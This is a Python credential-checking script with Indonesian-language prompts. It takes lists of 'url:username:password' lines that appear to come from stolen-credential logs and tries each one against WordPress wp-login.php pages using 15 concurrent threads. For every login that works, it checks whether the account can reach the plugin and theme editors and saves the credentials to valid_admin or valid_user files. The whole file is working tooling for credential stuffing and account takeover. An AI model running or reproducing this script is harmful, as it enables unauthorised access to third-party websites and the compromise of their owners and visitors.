import requests
import os
import re
import time
import sys
import tkinter as tk
from tkinter import filedialog
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style

os.system("clear")
print(Fore.GREEN + f"INPUT: https://url.com/wp-login.php:username:password\nOUTPUT: https://url.com/wp-login.php|username|password\nhttps://url.com/wp-login.php#username@password")
regex_list = {
    'Wordpress': re.compile(r'^(https?://[^\s:]*wp-login[^\s:]*|http?://[^\s:]*wp-login[^\s:]*|[^\s:]*wp-login[^\s:]*):(.*?):(.*?)$'),
    'WP-Admin': re.compile(r'^(https?://[^\s:]*|http?://[^\s:]*|[^\s:]*):(.*?/wp-admin[^\s:]*):(.*?):(.*?)$', re.I)
}

def parse_line(line):
    line = line.strip()
    for name, regex in regex_list.items():
        match = regex.match(line)
        if match:
            if name == 'Wordpress':
                url = match.group(1).replace('/wp-login.php', '')
                if not url.startswith('http'):
                    url = 'http://' + url
                return url, match.group(2), match.group(3)
            elif name == 'WP-Admin':
                url = match.group(1).rstrip('/')
                user = match.group(3)
                passwd = match.group(4)
                if not url.startswith('http'):
                    url = 'http://' + url
                return url, user, passwd
    return None, None, None

def is_admin(session, url):
    try:
        res = session.get(url.rstrip('/') + '/wp-admin/', timeout=10)
        if res.status_code == 200 and any(tag in res.text for tag in [
            "<a href='plugin-install.php'", "<a href='plugin-editor.php'", "<a href='theme-editor.php'"
        ]):
            return True
    except:
        pass
    return False

def check_wp_login(parsed_tuple):
    url, user, passwd = parsed_tuple
    login_url = url.rstrip('/') + '/wp-login.php'
    wp_admin_url = url.rstrip('/') + '/wp-admin/'

    try:
        session = requests.Session()
        session.headers.update({'User-Agent': 'Mozilla/5.0'})

        r1 = session.get(login_url, timeout=10)
        token_match = re.findall(r'id="wp-submit" class="button[^"]*" value="(.*?)"', r1.text)
        wp_submit = token_match[0] if token_match else 'Log In'

        time.sleep(0.1)

        payload = {
            'log': user,
            'pwd': passwd,
            'wp-submit': wp_submit,
            'redirect_to': wp_admin_url,
            'testcookie': '1'
        }
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': login_url,
        }

        r2 = session.post(login_url, data=payload, headers=headers, allow_redirects=False, timeout=10)
        cookies = session.cookies.get_dict()

        if r2.status_code in [302, 301] and any('wordpress_logged_in_' in c for c in cookies):
            is_admin_flag = is_admin(session, url)
            role = 'ADMIN' if is_admin_flag else 'USER'
            print(Fore.GREEN + f"[LOGIN-{role}] {url}/wp-login.php|{user}|{passwd}")

            result_line = f"{url}/wp-login.php|{user}|{passwd}\n"
            if is_admin_flag:
                with open('valid_admin.txt', 'a') as f:
                    f.write(result_line)
            else:
                with open('valid_user.txt', 'a') as f:
                    f.write(result_line)
        else:
            print(Fore.RED + f"[FAILED] {url}/wp-login.php|{user}|{passwd}")
        time.sleep(0.7)
    except Exception:
        print(Fore.RED + f"[ERROR] {url}/wp-login.php|{user}|{passwd}")

def main():
    # Deteksi apakah GUI tersedia
    if os.environ.get("DISPLAY") or sys.platform.startswith("win"):
        try:
            root = tk.Tk()
            root.withdraw()
            file_path = filedialog.askopenfilename(title="Pilih file list logs")
        except:
            file_path = input(Fore.CYAN + "Masukkan path file list logs: ").strip()
    else:
        file_path = input(Fore.CYAN + "Masukkan path file list logs: ").strip()

    if not file_path or not os.path.exists(file_path):
        print(Fore.RED + f"File tidak ditemukan atau dibatalkan!")
        return

    with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
        raw_lines = file.readlines()

    parsed_data = []
    for line in raw_lines:
        parsed = parse_line(line)
        if all(parsed):
            parsed_data.append(parsed)
        else:
            print(Fore.RED + f"[SKIPPED] Gagal parsing: {line.strip()}")

    if not parsed_data:
        print(Fore.RED + f"TIDAK ADA DATA VALID")
        return

    print(Fore.GREEN + f"[INFO] Mulai cek {len(parsed_data)} data...\n")

    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = [executor.submit(check_wp_login, entry) for entry in parsed_data]
        for _ in as_completed(futures):
            pass

    print(Fore.GREEN + f"[INFO] Berhasil Mengecek Semua Wordpress Logs ✅")

if __name__ == '__main__':
    main()
